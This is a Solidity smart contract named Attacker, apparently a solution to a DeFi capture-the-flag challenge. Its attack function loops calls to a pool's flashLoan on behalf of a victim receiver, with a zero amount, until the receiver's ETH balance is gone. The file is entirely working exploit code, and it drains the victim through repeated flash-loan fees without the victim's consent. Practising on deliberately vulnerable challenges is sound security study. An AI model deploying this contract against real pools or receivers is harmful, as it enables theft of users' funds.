pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract Attacker {

	using Address for address;

	function attack(address _pool, address receiver) public {

		do{
			_pool.functionCallWithValue(
				abi.encodeWithSignature(
					"flashLoan(address,uint256)",
					receiver,
					0 
				),
				0
			);
		}while(receiver.balance > 0);
	}
}